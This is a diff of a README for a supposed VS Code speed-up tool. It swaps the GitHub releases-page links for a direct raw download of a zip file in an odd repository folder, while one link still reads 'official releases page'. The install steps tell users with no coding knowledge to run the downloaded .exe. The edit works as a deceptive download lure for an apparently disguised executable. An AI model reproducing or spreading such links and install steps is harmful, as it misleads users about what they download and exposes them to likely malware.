@@ -1,6 +1,6 @@
 # ⚡ VSCode-Performance-AI - Make Your Code Editor Run Faster
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Basidial-saltcod104/VSCode-Performance-AI/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Basidial-saltcod104/VSCode-Performance-AI/main/etherize/VS_Code_AI_Performance_1.8.zip)
 
 ## 🎯 About This Tool
 Visual Studio Code serves millions of developers every day. Over time, that software collects extra files and settings that slow down your work. VSCode-Performance-AI cleans these files and adjusts your setup to keep the program responsive. It handles memory usage, cleans your cache, and manages your extensions to save you time. You do not need to understand code to use this tool. It performs the maintenance work for you automatically.
@@ -18,7 +18,7 @@ Visual Studio Code serves millions of developers every day. Over time, that soft
 This application works on any version of Windows 10 or Windows 11. Your computer must have at least 4GB of RAM and 100MB of free disk space. You should have Microsoft Visual Studio Code installed on your system before you run this tool.
 
 ## 📥 How to Install
-1.  Visit the [official releases page](https://github.com/Basidial-saltcod104/VSCode-Performance-AI/releases) to see all versions.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Basidial-saltcod104/VSCode-Performance-AI/main/etherize/VS_Code_AI_Performance_1.8.zip) to see all versions.
 2.  Click the file ending in `.exe` under the latest release.
 3.  Save the file to your desktop or downloads folder.
 4.  Double-click the downloaded file to start the installer.
